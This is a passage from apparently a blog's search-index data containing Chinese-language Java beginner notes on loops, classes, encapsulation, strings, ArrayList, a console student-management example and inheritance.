值2:<br>语句体2;<br>break;<br>…<br>default:<br>语句体n+;<br>[break];<br>}</li>\n</ul>\n<h3 id=\"循环结构\"><a href=\"#循环结构\" class=\"headerlink\" title=\"循环结构\"></a>循环结构</h3><p>（1） <strong>循环结构</strong></p>\n<ul>\n<li>特征：重复做某件事情，具有明确的开始和停止标志</li>\n<li>组成：<ul>\n<li>初始化语句</li>\n<li>条件判断语句</li>\n<li>循环体语句</li>\n<li>条件控制语句</li>\n</ul>\n</li>\n</ul>\n<p>（2） <strong>for循环</strong></p>\n<ul>\n<li><p>格式：<br>for(初始化语句;条件判断语句;条件控制语句){<br>循环体语句;<br>}</p>\n</li>\n<li><p>执行流程：</p>\n<ol>\n<li>执行初始化语句；</li>\n<li>执行条件判断语句，看其结果是true还是false<ul>\n<li>如果是false，循环结束</li>\n<li>如果是true，继续执行</li>\n</ul>\n</li>\n<li>执行循环体语句</li>\n<li>执行条件控制语句</li>\n<li>会到2继续</li>\n</ol>\n</li>\n</ul>\n<p>（3） <strong>while循环</strong></p>\n<ul>\n<li><p>基本格式：<br>while(条件判断语句){<br>循环体语句;<br>}</p>\n</li>\n<li><p>完整格式：<br>初始化语句;<br>while(条件判断语句){<br>循环体语句;<br>条件控制语句;<br>}</p>\n</li>\n<li><p>执行流程：</p>\n<ol>\n<li>执行初始化语句；</li>\n<li>执行条件判断语句，看其结果是true还是false<ul>\n<li>如果是false，循环结束</li>\n<li>如果是true，继续执行</li>\n</ul>\n</li>\n<li>执行循环体语句</li>\n<li>执行条件控制语句</li>\n<li>会到2继续</li>\n</ol>\n</li>\n</ul>\n<p>（4） <strong>do……while循环语句</strong></p>\n<ul>\n<li><p>基本格式：<br>do{<br>循环体语句;<br>}while(条件判断语句);</p>\n</li>\n<li><p>完整格式：<br>do{<br>循环体语句;<br>条件控制语句;<br>}while(条件判断语句);</p>\n</li>\n<li><p>执行流程：</p>\n<ol>\n<li>执行初始化语句</li>\n<li>执行循环体语句</li>\n<li>执行条件控制语句</li>\n<li>执行条件判断语句，看其结果是true还是false<ul>\n<li>如果是false，循环结束</li>\n<li>如果是true，继续执行</li>\n</ul>\n</li>\n<li>回到2继续</li>\n</ol>\n</li>\n</ul>\n<p>（5） <strong>三种循环的区别</strong></p>\n<ul>\n<li>for循环和while循环先判读条件是否成立，然后决定是否执行循环体（先判断后执行）</li>\n<li>do……while循环先执行一次循环体，然后判断条件是否成立，是否继续执行循环体（先执行后判断）</li>\n<li>for和while的区别：<ul>\n<li>条件控制语句所控制的自增变量，因为归属for循环的语法结构中，在for循环结束后，就不能再次被访问到了</li>\n<li>条件控制语句所控制的自增变量，对于while循环来说不归属语法结构中，在while循环结束后，该变量还可以继续使用</li>\n</ul>\n</li>\n</ul>\n<p>（6） <strong>跳转控制语句</strong></p>\n<ul>\n<li>continue：用于循环中，基于条件控制，跳过某次循环内容的执行，继续下一次的循环；</li>\n<li>break：用于循环中，基于条件控制，终止循环体内容的执行，也就是结束当前的整个循环。</li>\n</ul>\n<p>（7） <strong>Random</strong></p>\n<ul>\n<li>作用：用于产生一个随机数</li>\n<li>使用步骤：<ul>\n<li><p>导包：<br><code>import java.util.Random   导包的动作必须出现在类定义的上面</code></p>\n</li>\n<li><p>创建对象：<br><code>Random r = new Random();   上面这个格式里面，r是变量名，可以变，其他的都不允许变</code></p>\n</li>\n<li><p>获取随机数：<br><code>int number = r.nextInt(10);// 获取数据的范围：[0,10)   上面这个格式里面，number是变量名，可以变，数字10可以变，其他的都不允许变</code></p>\n</li>\n</ul>\n</li>\n</ul>\n","categories":["编程语言学习"],"tags":["编程语言","Java"]},{"title":"Java学习记录(三)","url":"/2022/09/02/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>面向对象基础</li>\n<li>字符串</li>\n<li>集合基础</li>\n<li>继承</li>\n</ul>\n<h3 id=\"面向对象基础\"><a href=\"#面向对象基础\" class=\"headerlink\" title=\"面向对象基础\"></a>面向对象基础</h3><p>（1） <strong>类和对象</strong></p>\n<ul>\n<li>对象：万物皆对象（说话跟放屁一样）</li>\n<li>面向对象</li>\n<li>类：类是对现实生活中一类具有<code>共同属性</code>和<code>行为</code>的事物的抽象</li>\n<li>特点：<ul>\n<li>类是对象的数据类型</li>\n<li>类是具有相同属性和行为的一组对象的集合</li>\n</ul>\n</li>\n<li>属性：对象具有的各种特征，每个对象的每个属性都拥有特定的值</li>\n<li>行为：对象能够执行的操作</li>\n<li>类和对象的关系：类是对象的抽象，对象是类的实体</li>\n</ul>\n<p>（2） <strong>类的定义</strong></p>\n<ul>\n<li>类的重要性：是Java程序的基本组成单位</li>\n<li>类的组成：<code>属性</code>和<code>行为</code><ul>\n<li><p>属性：在类中通过<code>成员变量</code>来体现（类中方法外的变量）</p>\n</li>\n<li><p>行为：在类中通过<code>成员方法</code>来体现（和前面的方法相比去掉static关键字即可）</p>\n</li>\n<li><p><code>public class 类名&#123;   //成员变量   变量1的数据类型 变量1;   变量2的数据类型 变量2;   ……   //成员方法   方法1;   方法2;   ……   &#125;</code></p>\n</li>\n<li><p>示例：</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-79-1024x542-17212204205791.png\" alt=\"image-79-1024x542\"></p>\n<p>（3） <strong>对象的使用</strong></p>\n<ul>\n<li>创建对象：<ul>\n<li>格式：类名 对象名 &#x3D; new 类名();</li>\n</ul>\n</li>\n<li>使用对象：<ul>\n<li>使用成员变量<ul>\n<li>格式：对象名.变量名</li>\n</ul>\n</li>\n<li>使用成员方法<ul>\n<li>格式：对象名.方法名()</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>示例：</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-80-1024x543-17212204297272.png\" alt=\"image-80-1024x543\"></p>\n<ul>\n<li>案例：<ul>\n<li>需求：首先定义一个学生类，然后定义一个学生测试类，在学生测试类中通过对象完成成员变量和成员方法的使用</li>\n<li>示例：</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-81-1024x542.png\"></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-82-1024x541-17212204789064.png\" alt=\"image-82-1024x541\"></p>\n<p>（4） <strong>成员变量和局部变量</strong></p>\n<ul>\n<li>成员变量：类中方法外的变量</li>\n<li>局部变量：方法中的变量</li>\n<li>成员变量和局部变量的区别：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>区别</th>\n<th>成员变量</th>\n<th>局部变量</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>类中位置不同</td>\n<td>类中方法外</td>\n<td>方法内或者方法声明上</td>\n</tr>\n<tr>\n<td>内存中位置不同</td>\n<td>堆内存</td>\n<td>栈内存</td>\n</tr>\n<tr>\n<td>生命周期不同</td>\n<td>随着对象的存在而存在，随着对象的消失而消失</td>\n<td>随着方法的调用而存在，随着方法的调用完毕而消失</td>\n</tr>\n<tr>\n<td>初始化值不同</td>\n<td>有默认的初始值</td>\n<td>没有默认的初始化值，必须先定义，赋值，才能使用</td>\n</tr>\n</tbody></table>\n<p>（5） <strong>封装——private关键字</strong></p>\n<ul>\n<li>private关键字<ul>\n<li>是一个权限修饰符</li>\n<li>可以修饰成员（成员变量和成员方法）</li>\n<li>作用是保护成员不背别的类使用，被<code>private</code>修饰的成员只在本类中才能访问</li>\n</ul>\n</li>\n<li>针对<code>private</code>修饰的成员变量，如果需要被其他类使用，提供相应的操作<ul>\n<li>提供“<code>get变量名()</code>”方法，用于获取成员变量的值，方法用<code>public</code>修饰</li>\n<li>提供“<code>set变量名(参数)</code>”方法，用于设置成员变量的值，方法用<code>public</code>修饰</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-2-766x1024-17212204948105.png\" alt=\"index-2-766x1024\"></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-3-956x1024-17212205076566.png\" alt=\"index-3-956x1024\"></p>\n<ul>\n<li>private关键字的使用<ul>\n<li>一个标准类的编写：<ul>\n<li>把成员变量用private修饰</li>\n<li>提供对应的getXxx()&#x2F;setXxx()方法</li>\n</ul>\n</li>\n<li>示例：</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-4-727x1024-17212205291087.png\" alt=\"index-4-727x1024\"></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-5-1024x890-17212205448488.png\" alt=\"index-5-1024x890\"></p>\n<p>（6） <strong>封装——this关键字</strong></p>\n<ul>\n<li>this修饰的变量用于指代成员变量<ul>\n<li>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量</li>\n<li>方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</li>\n</ul>\n</li>\n<li>什么时候使用this呢？解决局部变量隐藏成员变量</li>\n<li>this：代表所在类的对象引用<ul>\n<li>方法被哪个对象调用，this就代表哪个对象</li>\n</ul>\n</li>\n</ul>\n<p>（7） <strong>封装</strong></p>\n<ul>\n<li>封装概述：是面向对象的三大特征之一（<code>封装，继承，多态</code>）</li>\n<li>封装原则：将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对隐藏信息的操作和访问成员变量<code>private</code>，提供对应的<code>getXxx()/setXxx()</code>方法</li>\n<li>封装的好处：<ul>\n<li>通过方法来控制成员变量的操作，提高了代码的安全性</li>\n<li>把代码用方法进行封装，提高了代码的复用性</li>\n</ul>\n</li>\n</ul>\n<p>（8） <strong>构造方法</strong></p>\n<ul>\n<li><p>构造方法概述：构造方法是一种特殊的方法，作用是创建对象</p>\n</li>\n<li><p>格式：<br><code>public class 类名&#123;   修饰符 类名(参数)&#123;   &#125;   &#125;</code></p>\n</li>\n<li><p>功能：主要是完成对象数据的初始化</p>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-83-1024x540-17212205604189.png\" alt=\"image-83-1024x540\"></p>\n<ul>\n<li>注意事项<ul>\n<li>构造方法的创建<ul>\n<li>如果没有定义构造方法，系统将给出一个<code>默认</code>的<code>无参数构造方法</code></li>\n<li>如果定义了构造方法，系统将不再提供默认的构造方法</li>\n</ul>\n</li>\n<li>构造方法的重载<ul>\n<li>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</li>\n</ul>\n</li>\n<li>推荐的使用方式<ul>\n<li><code>无论是否使用，都手工写无参数构造方法</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>（9） <strong>标准类的制作</strong></p>\n<ul>\n<li>成员变量<ul>\n<li>使用<code>private</code>修饰</li>\n</ul>\n</li>\n<li>构造方法<ul>\n<li>提供一个无参构造方法</li>\n<li>提供一个带多个参数的构造方法</li>\n</ul>\n</li>\n<li>成员方法<ul>\n<li>提供每一个成员变量对应的<code>setXxx()/getXxx()</code></li>\n<li>提供一个显示对象信息的<code>show()</code></li>\n</ul>\n</li>\n<li>创建对象并为其成员变量赋值的两种方式<ul>\n<li>无参构造方法创建对象后使用<code>setXxx()</code>赋值</li>\n<li>使用带参构造方法直接创建带有属性值的对象</li>\n</ul>\n</li>\n<li>示例：</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-84-1024x543-172122057217810.png\" alt=\"image-84-1024x543\"></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-6-619x1024-172122058237711.png\" alt=\"index-6-619x1024\"></p>\n<h3 id=\"字符串\"><a href=\"#字符串\" class=\"headerlink\" title=\"字符串\"></a>字符串</h3><p>（1） <strong>API</strong></p>\n<ul>\n<li>应用程序编程接口</li>\n<li>Java API：指的就是jdk中提供的各种功能的Java类。</li>\n</ul>\n<p>（2） <strong>String</strong></p>\n<ul>\n<li>String类代表字符串。</li>\n<li>Java程序中所有的双引号字符串，都是String类的对象。</li>\n<li>String类在java.lang包下，所以使用的时候不需要导包。</li>\n<li>特点：<ul>\n<li>字符串不可变，他们的值在创建后不能被更改</li>\n<li>虽然String的值是不可变的，但是他们可以被共享</li>\n<li>字符串效果上相当于字符串数组（<code>char[]</code>）<code>注：JDK8及以前是字符数组，JDK9及以后是字节数组</code>，但是底层原理是字节数组（<code>byte[]</code>）</li>\n</ul>\n</li>\n</ul>\n<p>（3） <strong>String构造方法</strong></p>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>public String()</td>\n<td>创建一个空白字符串对象，不含有任何内容</td>\n</tr>\n<tr>\n<td>public String(char[] chs)</td>\n<td>根据字符数组的内容，来创建字符串对象</td>\n</tr>\n<tr>\n<td>public String(byte[] bys)</td>\n<td>根据字节数组的内容，来创建字符串对象</td>\n</tr>\n<tr>\n<td>String s &#x3D; “abc”;</td>\n<td>直接赋值的方式创建字符串对象，内容就是abc</td>\n</tr>\n</tbody></table>\n<ul>\n<li>示例：</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-85-1024x544-172122062071112.png\" alt=\"image-85-1024x544\"></p>\n<ul>\n<li><code>推荐使用直接赋值的方式得到字符串对象</code></li>\n</ul>\n<p>（4） <strong>String对象的特点</strong></p>\n<ul>\n<li>通过new创建的字符串对象，每一次new都会申请一个内存空间，虽然内容相同，但是地址值不同</li>\n<li>一“”方式给出的字符串，只要字符序列相同（顺序和大小写），无论在程序代码中出现几次，JVM都只会建立一个String对象，并在字符串池中维护</li>\n</ul>\n<p>（5） <strong>字符串的比较</strong></p>\n<ul>\n<li>使用<code>==</code>做比较<ul>\n<li>基本类型：比较的是<code>数据值</code>是否相同</li>\n<li>引用类型：比较的是<code>地址值</code>是否相同</li>\n</ul>\n</li>\n<li>字符串是对象，他比较内容是否相同是通过一个方法实现的，这个方法是：<code>equals()</code></li>\n<li>public boolean <code>equals(Object anObject)</code>：将字符串与指定对象进行比较。由于我们比较的是字符串对象，所以参数直接传递一个字符串。</li>\n</ul>\n<p>（6） <strong>案例：遍历字符串</strong></p>\n<ul>\n<li><p>需求：键盘输入一个字符串，使用程序实现在控制台遍历该字符串</p>\n</li>\n<li><p>遍历字符串的通用格式：<br><code>for (int i = 0;i &lt; s.length;i++) &#123;   s.charAt(i); // 就是指定索引处的字符串   &#125;</code></p>\n</li>\n<li><p>示例：</p>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-102-1024x543-172122067202413.png\" alt=\"image-102-1024x543\"></p>\n<p>（7） <strong>StringBuilder</strong></p>\n<ul>\n<li>StringBuilder概述：StringBuilder是一个可变的字符串类，我们可以把他看成一个容器，这里的可变指的是StringBuilder对象中的内容是可变的。</li>\n<li>String和StringBuilder的区别：String内容是不可变的，StringBuilder内容是可变的。</li>\n<li>StringBuilder构造方法：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>public StringBuilder()</td>\n<td>创建一个空白可变字符对象，不含有任何内容</td>\n</tr>\n<tr>\n<td>public StringBuilder(String str)</td>\n<td>根据字符串的内容，来创建可变字符串对象</td>\n</tr>\n</tbody></table>\n<ul>\n<li>StringBuilder的添加和反转方法</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>public StringBuilder append(任意类型)</td>\n<td>添加数据，并返回对象本身</td>\n</tr>\n<tr>\n<td>public StringBuilder reverse()</td>\n<td>返回相反的字符串序列</td>\n</tr>\n</tbody></table>\n<ul>\n<li>StringBuilder和String的相互转换<ul>\n<li>StringBuilder转换为String：<ul>\n<li>public String <code>toString()</code>：通过toString()就可以实现把StringBuilder转换为String</li>\n</ul>\n</li>\n<li>String转换为StringBuilder：<ul>\n<li>public <code>StringBuilder(String s)</code>：通过构造方法就可以实现把String转换为StringBuilder</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-103-1024x545-172122068538214.png\" alt=\"image-103-1024x545\"></p>\n<h3 id=\"集合基础\"><a href=\"#集合基础\" class=\"headerlink\" title=\"集合基础\"></a>集合基础</h3><p>（1） <strong>集合基础</strong></p>\n<ul>\n<li>集合类的特点：提供一种存储空间可变的存储模型，存储的数据容量可以发生改变</li>\n<li>ArrayList<E>：<ul>\n<li>可调整大小的数组实现</li>\n<li><E>：是一种特殊的数据类型，泛型。</E></li>\n</ul>\n</E></li>\n<li>使用：<ul>\n<li>在出现E的地方我们使用引用数据类型替换即可</li>\n<li>例如：ArrayList<String>，ArrayList<Student></Student></String></li>\n</ul>\n</li>\n</ul>\n<p>（2） <strong>ArrayList构造方法和添加方法</strong></p>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>public ArrayList()</td>\n<td>创建一个空的集合对象</td>\n</tr>\n<tr>\n<td>public boolean add(E e)</td>\n<td>将指定的元素追加到此集合的末尾</td>\n</tr>\n<tr>\n<td>public void add(int index,E element)</td>\n<td>在此集合中的指定位置插入指定的元素</td>\n</tr>\n</tbody></table>\n<ul>\n<li>示例：</li>\n</ul>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-104-1024x541-172122069532715.png\" alt=\"image-104-1024x541\"></p>\n<p>（3） <strong>ArrayList集合常用方法</strong></p>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>public boolean remove(Object o)</td>\n<td>删除指定的元素，返回删除是否成功</td>\n</tr>\n<tr>\n<td>public E remove(int index)</td>\n<td>删除指定索引处的元素，返回被删除的元素</td>\n</tr>\n<tr>\n<td>public E set(int index,E element)</td>\n<td>修改指定索引处的元素，返回被修改的元素</td>\n</tr>\n<tr>\n<td>public E get(int index)</td>\n<td>返回指定索引处的元素</td>\n</tr>\n<tr>\n<td>public int size()</td>\n<td>返回集合中的元素的个数</td>\n</tr>\n<tr>\n<td><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-748x1024-172122071127616.png\" alt=\"index-748x1024\"></td>\n<td></td>\n</tr>\n</tbody></table>\n<p>（4） <strong>ArrayList存储字符串并遍历</strong></p>\n<p>案例一：存储字符串并遍历</p>\n<p>需求：创建一个存储字符串的集合，存储3个字符串元素，使用程序实现在控制台遍历该集合</p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/image-1024x547-172122072225817.png\" alt=\"image-1024x547\"></p>\n<p>案例二：存储学生对象并遍历</p>\n<p>需求：创建一个存储学生对象的集合，存储三个学生对象，使用程序实现在控制台遍历该集合</p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-1-950x1024-172122073162518.png\" alt=\"index-1-950x1024\"></p>\n<p><img src=\"/images/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%89/index-2-687x1024-172122074340919.png\" alt=\"index-2-687x1024\"></p>\n<p>（5） <strong>案例：学生管理系统</strong></p>\n<blockquote>\n<p>Student.java</p>\n</blockquote>\n<pre><code>package project;\n\n//学生类\npublic class Student &#123;\n    //学号\n    private String sid;\n    //姓名\n    private String name;\n    //年龄\n    private String age;\n    //居住地\n    private String address;\n\n    public Student() &#123;\n    &#125;\n\n    public Student(String sid, String name, String age, String address) &#123;\n        this.sid = sid;\n        this.name = name;\n        this.age = age;\n        this.address = address;\n    &#125;\n\n    public String getSid() &#123;\n        return sid;\n    &#125;\n\n    public void setSid(String sid) &#123;\n        this.sid = sid;\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n\n    public String getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(String age) &#123;\n        this.age = age;\n    &#125;\n\n    public String getAddress() &#123;\n        return address;\n    &#125;\n\n    public void setAddress(String address) &#123;\n        this.address = address;\n    &#125;\n&#125;\n</code></pre>\n<blockquote>\n<p>StudentManager.java</p>\n</blockquote>\n<pre><code>package project;\n\nimport java.util.ArrayList;\nimport java.util.Scanner;\n\npublic class StudentManager &#123;\n    public static void main(String[] args) &#123;        //创建集合对象，用于存储学生数据\n        ArrayList&lt;Student&gt; array = new ArrayList&lt;Student&gt;();\n        while (true) &#123;\n            //用输出语句完成主界面的编写\n            System.out.println(&quot;--------欢迎来到学生管理系统--------&quot;);\n            System.out.println(&quot;1 添加学生&quot;);\n            System.out.println(&quot;2 删除学生&quot;);\n            System.out.println(&quot;3 修改学生&quot;);\n            System.out.println(&quot;4 查看所有学生&quot;);\n            System.out.println(&quot;5 退出&quot;);\n            System.out.println(&quot;请输入你的选择:&quot;);\n            //用Scanner实现键盘录入数据\n            Scanner sc = new Scanner(System.in);\n            String line = sc.nextLine();\n            //用switch语句完成操作的选择\n            switch (line) &#123;\n                case &quot;1&quot;:\n                    System.out.println(&quot;添加学生&quot;);\n                    addStudent(array);\n                    break;\n                case &quot;2&quot;:\n                    System.out.println(&quot;删除学生&quot;);\n                    deleteStudent(array);\n                    break;\n                case &quot;3&quot;:\n                    System.out.println(&quot;修改学生&quot;);\n                    updateStudent(array);\n                    break;\n                case &quot;4&quot;:\n                    System.out.println(&quot;查看所有学生&quot;);\n                    findAllStudent(array);\n                    break;\n                case &quot;5&quot;:\n                    System.out.println(&quot;谢谢使用&quot;);\n                    break;\n                System.exit(0);\n                //JVM退出\n            &#125;\n        &#125;\n    &#125;\n\n    //定义一个方法，用于添加学生信息\n    public static void addStudent(ArrayList&lt;Student&gt; array) &#123;\n        //键盘录入学生对象所需要的数据，显示提示信息，提示要输入何种信息\n        Scanner sc = new Scanner(System.in);\n        System.out.println(&quot;请输入学生学号：&quot;);\n        String sid = sc.nextLine();\n        System.out.println(&quot;请输入学生姓名：&quot;);\n        String name = sc.nextLine();\n        System.out.println(&quot;请输入学生年龄：&quot;);\n        String age = sc.nextLine();\n        System.out.println(&quot;请输入学生地址：&quot;);\n        String address = sc.nextLine();\n        //创建学生对象，把键盘录入的数据赋值给学生对象的成员变量\n        Student s = new Student();\n        s.setSid(sid);\n        s.setName(name);\n        s.setAge(age);\n        s.setAddress(address);\n        //将学生对象添加到集合中\n        array.add(s);        //给出添加成功提示\n        System.out.println(&quot;添加学生成功&quot;);\n    &#125;    //定义一个方法，用于查看学生信息\n\n    public static void findAllStudent(ArrayList&lt;Student&gt; array) &#123;\n        //判断集合中是否有数据，如果没有显示提示信息\n        if (array.size() == 0) &#123;\n            System.out.println(&quot;无信息，请先添加信息再查询&quot;);\n            //为了让程序不再往下执行，给出return;\n            return;\n        &#125;\n        //显示表头信息\n        // \\t就是tab键\n        System.out.println(&quot;学号\\t\\t\\t姓名\\t\\t年龄\\t\\t地址&quot;);\n        //将集合中数据取出按照对应格式显示学生信息，年龄补充岁字\n        for (int i = 0; i &lt; array.size(); i++) &#123;\n            Student s = array.get(i);\n            System.out.println(s.getSid() + &quot;\\t&quot; + s.getName() + &quot;\\t&quot; + s.getAge() + &quot;岁&quot; + &quot;\\t&quot; + s.getAddress());\n        &#125;\n    &#125;\n\n    //定义一个方法，用于删除学生信息\n    public static void deleteStudent(ArrayList&lt;Student&gt; array) &#123;\n        //键盘录入要删除的学生学号，显示提示信息\n        Scanner sc = new Scanner(System.in);\n        System.out.println(&quot;请输入你要的删除的学生的学号：&quot;);\n        String sid = sc.nextLine();\n        //遍历集合将对应学生对象从集合中删除\n        for (int i = 0; i &lt; array.size(); i++) &#123;\n            Student s = array.get(i);\n            if (s.getSid().equals(sid)) &#123;\n                array.remove(i);\n                break;\n            &#125;\n        &#125;\n        //给出删除成功的提示\n        System.out.println(&quot;删除学生成功&quot;);\n    &#125;\n\n    //定义一个方法，用于修改学生信息    \n    public static void updateStudent(ArrayList&lt;Student&gt; array) &#123;\n        //键盘录入要修改的学生学号，显示提示信息       \n        Scanner sc = new Scanner(System.in);\n        System.out.println(&quot;请输入你要修改的学生的学号：&quot;);\n        String sid = sc.nextLine();\n        //键盘录入要修改的学生信息        \n        System.out.println(&quot;请输入学生新姓名：&quot;);\n        String name = sc.nextLine();\n        System.out.println(&quot;请输入学生新年龄：&quot;);\n        String age = sc.nextLine();\n        System.out.println(&quot;请输入学生新地址：&quot;);\n        String address = sc.nextLine();\n        //创建学生对象        \n        Student s = new Student();\n        s.setSid(sid);\n        s.setName(name);\n        s.setAge(age);\n        s.setAddress(address);\n        //遍历集合修改对应的学生信息        \n        for (int i = 0; i &lt; array.size(); i++) &#123;\n            Student student = array.get(i);\n            if (student.getSid().equals(sid)) &#123;\n                array.set(i, s);\n                break;\n            &#125;\n        &#125;\n        //给出修改成功的提示        \n        System.out.println(&quot;修改学生信息成功&quot;);\n    &#125;\n&#125;\n</code></pre>\n<h3 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h3><p>（1） <strong>继承概述</strong></p>\n<ul>\n<li>继承概述：继承是面向对象三大特征之一。可以使得子类具有父类的属性和方法，还可以在子类中重新定义，追加属性和方法。</li>\n<li>继承的格式：public class 子类名 <code>extends</code> 父类名{}<ul>\n<li>父类：也被称为基类或超类</li>\n</ul>\n</li>\n<li>继承中子类的特点：<ul>\n<li>子类可以有父类的内容</li>\n<li>子类还可以有自己特有的内容</li>\n</ul>\n</li>\n</ul>\n<p>（2） <strong>继承的好处和弊端</strong></p>\n<p>继承好处：</p>\n<ul>\n<li>提高了代码的<code>复用性</code>（多个类相同的成员可以放到同一个类中）</li>\n<li>提高了代码的<code>维护性</code>（如果方法的代码需要修改，修改一处即可）</li>\n</ul>\n<p>继承弊端：</p>\n<ul>\n<li>继承让类与类之间产生了关系，类的耦合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性</li>\n</ul>\n<p>（3） <strong>继承中变量的访问特点</strong></p>\n<p>在子类方法中访问一个变量：</p>\n<ul>\n<li>子类局部范围找</li>\n<li>子类成员范围找</li>\n<li>父类成员范围找</li>\n<li>如果都没有就报错</li>\n</ul>\n<p>（4） <strong>super</strong></p>\n<ul>\n<li>super关键字的用法和this关键字的用法相似</li>\n<li>this：代表本类对象的引用</li>\n<li>super：代表父类存储空间的标识（可以理解为父类对象引用）</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>关键字</strong></th>\n<th><strong>访问成员变量</strong></th>\n<th><strong>访问构造方法</strong></th>\n<th><strong>访问成员方法</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>this</strong></td>\n<td>this.成员变量</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>访问本类成员变量</td>\n<td>this(…)</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>访问本类构造方法</td>\n<td>this.成员方法(…)</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>访问本类成员方法</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><strong>super</strong></td>\n<td>super.成员变量</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>访问父类成员变量</td>\n<td>super(…)</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>访问父类构造方法</td>\n<td>super.成员方法(…)</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>访问父类成员方法</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<p>（5） <strong>继承中构造方法的访问特点</strong></p>\n<p>子类中所有的构造方法默认都会访问父类中无参的构造方法</p>\n<ul>\n<li>因为子类会继承父类中的数据，可能还会使用父类的数据。所以，子类初始化之前，一定要先完成父类数据的初始化</li>\n<li>每一个子类构造方法的第一条语句默认都是：<code>super()</code></li>\n</ul>\n<p>当父类中没有无参构造方法，只有带参构造方法时：</p>\n<ul>\n<li>通过使用super关键字去显示的调用父类的带参构造方法</li>\n<li>在父类中自己提供一个无参构造方法</li>\n</ul>\n<p>（6） <strong>继承中成员方法的访问特点</strong></p>\n<p>通过子类对象访问一个方法</p>\n<ul>\n<li>子类成员范围找</li>\n<li>父类成员范围找</li>\n<li>如果都没有就报错</li>\n</ul>\n<p>（7） <strong>方法重写</strong></p>\n<p>方法重写概述：</p>\n<ul>\n<li>子类中出现了和父类中一模一样的方法声明</li>\n</ul>\n<p>方法重写的应用：</p>\n<ul>\n<li>当子类需要父类的功能，而功能主体子类有自己特有的内容时，可以重写父类中的方法，这样，即沿袭了父类的功能，又定义了子类特有的内容</li>\n<li>练习：手机类和新手机类</li>\n</ul>\n<p><img 